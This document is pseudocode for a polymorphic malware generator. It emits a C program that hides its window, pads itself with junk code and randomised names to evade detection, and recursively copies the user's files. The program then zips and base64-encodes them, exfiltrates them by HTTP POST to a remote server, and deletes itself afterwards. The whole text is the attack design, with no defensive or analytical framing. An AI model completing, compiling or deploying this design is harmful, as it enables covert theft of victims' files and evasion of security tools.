FUNCTION get_seed()
    RETURN current_time XOR current_process_id
END FUNCTION

FUNCTION generate_polymorphic_code(arguments)
    OPEN file "poly_attack.c" FOR writing
    IF file NOT open THEN RETURN

    seed = get_seed()
    INITIALIZE random generator with seed

    vars = get_variable_names()
    funcs = get_function_names(seed)
    IF vars or funcs empty THEN
        CLEANUP and RETURN
    END IF

    // pick random unique variable and function names for polymorphism
    SELECT 6 unique vars FROM vars
    SELECT 3 unique funcs FROM funcs
    ASSIGN descriptive roles to selected vars and funcs

    WRITE C headers to output file

    // write decryption function
    WRITE decrypt_function(func_decrypt_str)

    // write string search function
    WRITE string_contains_function(func_str_contains)

    // write recursive directory scan function
    WRITE scan_directory_function(func_scan_dir, var_find_handle, var_find_data, var_out_dir, var_temp_buf)

    // write main function
    FUNCTION main()
        HIDE console window
        INITIALIZE junk variables
        WRITE junk code

        SET output directory and decrypt
        CREATE output directory IF not exists
        LOG directory creation

        SETUP variables for scanning: find handle, find data, temp buffer
        GET current user and root path
        WRITE junk code

        files_copied = 0
        START scan timer
        CALL scan_directory(root_path, &find_handle, find_data, output_dir, temp_buffer, depth=0, &files_copied)
        LOG number of files copied and elapsed time

        IF files_copied == 0 THEN
            LOG "skip exfiltration"
            GOTO cleanup
        END IF

        // prepare zip archive of collected files
        CREATE zip_path in temp folder
        BUILD PowerShell compress command
        EXECUTE PowerShell zip
        IF zip fails THEN
            FALLBACK: copy individual files
        END IF

        // read zip/archive into memory and base64 encode
        ALLOCATE buffer
        READ zip file into buffer
        BASE64 encode buffer

        // attempt network exfiltration via HTTP
        INITIALIZE Winsock
        FOR each port in [80, 8088]
            TRY connect to server
            SEND HTTP POST with base64 data
            IF success THEN
                LOG success
                BREAK
            ELSE
                LOG failure
            END IF
        END FOR
        CLEANUP Winsock

        // fallback exfiltration to local hidden file
        WRITE base64 to fallback file if network failed

        LABEL cleanup:
        LOG start cleanup
        REMOVE temporary files and zip archive
        SCHEDULE self-deletion of executable
        LOG cleanup complete
    END FUNCTION

    CLOSE output file
    FREE allocated memory
END FUNCTION

MAIN:
    CALL generate_polymorphic_code(command-line arguments)
END MAIN
